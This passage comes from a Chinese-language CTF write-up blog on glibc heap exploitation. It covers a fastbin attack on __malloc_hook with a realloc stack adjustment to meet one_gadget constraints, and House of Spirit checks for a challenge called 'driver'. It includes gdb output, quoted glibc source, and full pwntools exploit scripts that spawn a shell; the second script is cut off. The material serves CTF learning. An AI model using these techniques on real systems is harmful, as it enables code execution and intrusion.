p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br></pre></td></tr></table></figure><p>这里常规操作，接下来的才是重头戏</p><h4 id="one-gadget失败"><a href="#one-gadget失败" class="headerlink" title="one_gadget失败"></a>one_gadget失败</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line"><span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里你用payload = “a”*0xb + p64(one_gadget)你会发觉成功不了，</p><p>而malloc_hook和realloc_hook通常是一起的，所以我们可以利用这个组合达到一个目的，调整栈过后在one_gadget,具体如何往下看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>原因就是环境对不上，接下来讲下如何让环境对的上这个</p><ol><li><p>首先将realloc_hook覆盖成随便一个无法正常运行的地址<br>例如这种 payload = “a”*0xb + p64(0xAAAAAAAA)<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/1.png" alt="1.png"><br>成功断下</p></li><li><p>查看现在栈环境，跟上面的差别是什么</p></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30-0x20</span><br><span class="line">0x7ffc01f8c508:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c518:	0x00007fb957514e90	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x50</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x70</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">0x7ffc01f8c598:	0x5c71a837f5655700	0x0000562794412050</span><br><span class="line">0x7ffc01f8c5a8:	0x00007fb9574fe830	0x0000000000000001</span><br></pre></td></tr></table></figure><p>看，上述环境没有一个符合了，那么现在该如何做呢，发觉0x10可以，0x40可以，还有0x60可以，<br>栈是往低地址生长的<br>也就是说我们只要将rsp提高0x10,就变成rsp+0x10+0x30了就可以了</p><p>调用一个函数过后通常来说栈是平衡的<br>只要我们稍微改动一下我们调用的位置就行了，比如函数头地址+4，从这里开始执行，假设绕过一个push，这样的话，就相当于pop多一个，pop多一个的话，esp会提高一个寄存器大小的位置，也就是rsp=rsp+0x8<br>利用这个特性，我们也就是说可以调整栈，让其指定位置为0</p><p>我们调整第2个one_gadget吧，让其提高0x10就可以了，怎么让其提高呢，我们可以利用malloc这个函数，因为他会调用malloc_hook，组合调用<br>我就选了malloc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p __libc_malloc</span><br><span class="line"><span class="variable">$1</span> = &#123;void *(size_t)&#125; 0x7f4137102130 &lt;__GI___libc_malloc&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble 0x7f4137102130 </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> __GI___libc_malloc:</span><br><span class="line">   0x00007f4137102130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f4137102131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f4137102132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00007f4137102136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f4137441ef0</span></span><br><span class="line">   0x00007f413710213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f4137102140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f4137102143 &lt;+19&gt;:	jne    0x7f4137102298 &lt;__GI___libc_malloc+360&gt;</span><br><span class="line">   0x00007f4137102149 &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x33fc40]        <span class="comment"># 0x7</span></span><br></pre></td></tr></table></figure><p>看函数头，我们发觉有两个push，一个sub rsp,0x8,<br>计算下我们有0x18可控，所以我们提高0x10的话，就从+2开始就行了，<br>所以<strong>payload = “a”*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])</strong><br>前面的a填充过后就是realloc_hook，覆盖成malloc+0x2，所以这样让栈提高0x10,接下来是malloc函数，</p><p>具体个执行过程呢就是realloc_hook被覆盖成malloc+2了，malloc_hook被覆盖成one_gadget了，<br>所以先执行的是malloc+2,然后执行malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0x7f1e223d2132 &lt;malloc+2&gt;          sub    rsp, 8</span><br><span class="line">► 0x7f1e223d2136 &lt;malloc+6&gt;          mov    rax, qword ptr [rip + 0x33fdb3] &lt;0x7f1e223d2132&gt;</span><br><span class="line">  0x7f1e223d213d &lt;malloc+13&gt;         mov    rax, qword ptr [rax]</span><br><span class="line">  0x7f1e223d2140 &lt;malloc+16&gt;         <span class="built_in">test</span>   rax, rax</span><br><span class="line">  0x7f1e223d2143 &lt;malloc+19&gt;         jne    malloc+360 &lt;0x7f1e223d2298&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e223d2298 &lt;malloc+360&gt;        mov    rsi, qword ptr [rsp + 0x18]</span><br><span class="line">  0x7f1e223d229d &lt;malloc+365&gt;        add    rsp, 8</span><br><span class="line">  0x7f1e223d22a1 &lt;malloc+369&gt;        pop    rbx</span><br><span class="line">  0x7f1e223d22a2 &lt;malloc+370&gt;        pop    rbp</span><br><span class="line">  0x7f1e223d22a3 &lt;malloc+371&gt;        jmp    rax</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e2239326a &lt;do_system+1098&gt;    mov    rax, qword ptr [rip + 0x37ec47]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc调用前会查看mallo_hook是否存在，存在就调用malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0x00007f1e223d2130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f1e223d2131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f1e223d2132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">=&gt; 0x00007f1e223d2136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f1e22711ef0</span></span><br><span class="line">   0x00007f1e223d213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f1e223d2140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f1e223d2143 &lt;+19&gt;:	jne    0x7f1e223d2298 &lt;__GI___libc_malloc+360&gt;</span><br></pre></td></tr></table></figure><p>这里就是查看malloc_hook部分，若有调到+360处</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/2.png" alt="2.png"></p><p>看，成功迁移位置</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/3.png" alt="3.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.a0yo4SjOZB/Box'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line">text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit(<span class="number">-12</span>, payload)</span><br><span class="line">    lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">    addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">    libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line">    <span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line">	    <span class="keyword">raise</span> EOFError</span><br><span class="line">    </span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line">    <span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">    edit(<span class="number">3</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h2><p>开头没想到怎么利用，他利用了top_chunk合并将unsortbin合并了，以前只是防止合并，利用合并也是个知识盲点</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>House Of Spirit¶<br>介绍<br>House of Spirit 是 the Malloc Maleficarum 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK<br>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。<br>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p><p>又补充了知识盲区，要将chunk放入fastbin，得过掉检查，其中一个便是下一个chunk的size检查，不能小于两倍的size_s，并且不能大于sysstem_mem</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">      and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">      bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span></span><br><span class="line">       <span class="comment">// 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">            ) &#123;</span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">        <span class="comment">// 如果出现这样的情况，就报错。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(</span><br><span class="line">                chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">            __builtin_expect(</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* We might not have a lock at this point and concurrent</span></span><br><span class="line"><span class="comment">               modifications</span></span><br><span class="line"><span class="comment">               of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">               after getting the lock.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">                    assert(locked == <span class="number">0</span>);</span><br><span class="line">                    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                    locked = <span class="number">1</span>;</span><br><span class="line">                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                &#125;)) &#123;</span><br><span class="line">                errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">                locked = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">        <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">        set_fastchunks(av);</span><br><span class="line">        <span class="comment">// 根据大小获取fast bin的索引</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        <span class="comment">// 获取对应fastbin的头指针，被初始化后为NULL。</span></span><br><span class="line">        fb               = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">        <span class="comment">// 使用原子操作将P插入到链表中</span></span><br><span class="line">        mchunkptr    old     = *fb, old2;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">               add</span></span><br><span class="line"><span class="comment">               (i.e., double free).  */</span></span><br><span class="line">            <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">            <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">               size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">               only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old));</span><br><span class="line">            p-&gt;fd = old2 = old;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">                 old2);</span><br><span class="line">        <span class="comment">// 确保fast bin的加入前与加入后相同</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还用到了unsortbin攻击，强，各种组合，多次house of sprit加unsortbin攻击</p><p>整体流程，unlink造成可以house of sprit攻击，然后通过多次house of sprit攻击，后门用unsortedbin攻击，最后getshell,流程复杂，原理简单</p><p>我本来想用chunk extends加fastbin attack，发觉他给了这么多功能好像没用上，应该不是这个攻击方法。。。然后就去看wp了，发觉他的wp攻击流程那些点全用上了，不过复杂起来了，赛后还看到另外师傅的wp，就是说这个有非预期，就是说这个有非预期，就是用chunk extends加fastbin attack</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.ReKO1V3cZk/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span 